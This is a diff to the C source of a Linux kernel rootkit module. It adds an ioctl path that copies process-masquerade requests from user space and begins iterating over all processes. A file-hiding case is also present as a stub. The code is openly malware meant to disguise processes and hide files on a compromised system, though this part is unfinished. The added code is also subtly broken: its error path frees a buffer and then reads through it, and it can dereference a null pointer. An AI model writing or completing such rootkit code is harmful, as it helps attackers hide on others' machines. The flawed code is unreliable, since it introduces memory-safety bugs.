@@ -1,4 +1,5 @@
 #include <linux/sched.h>
+#include <linux/signal.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
@@ -39,6 +40,11 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			  unsigned long arg)
 {
 	int ret = 0;
+	int n;
+	int i;
+	struct task_struct *p;
+	struct masq_proc_req *req;
+	struct masq_proc_req *usr_rq;
 	pr_info("%s\n", __func__);
 
 	switch (ioctl) {
@@ -53,7 +59,43 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		}
 		break;
 	case IOCTL_MOD_MASQ:
+		n = sizeof(struct masq_proc_req);
+		req = kmalloc(n, GFP_KERNEL);
+		usr_rq = (struct masq_proc_req *)arg;
+		if (!req) {
+			ret = -ENOMEM;
+			goto masq_fail;
+		}
+		if (copy_from_user(req, usr_rq, n)) {
+			ret = -EFAULT;
+			goto masq_fail;
+		}
+
+		n = req->len * sizeof(struct masq_proc);
+		req->list = kmalloc(n, GFP_KERNEL);
+		if (!req->list) {
+			ret = -ENOMEM;
+			goto masq_fail;
+		}
+
+		n = sizeof(struct masq_proc);
+		for (i = 0; i < req->len; i++) {
+			if (copy_from_user(req->list+i, &usr_rq->list[i], n)) {
+				ret = -EFAULT;
+				goto masq_fail;
+			}
+			pr_info("req->list[%d]: %s", i, req->list[i]);
+		}
+
+		for_each_process(p) {
+		}
 		break;
+masq_fail:
+		if (req)
+			kfree(req);
+		if (req->list)
+			kfree(req->list);
+		return ret;
 	case IOCTL_FILE_HIDE:
 		break;
 	default:
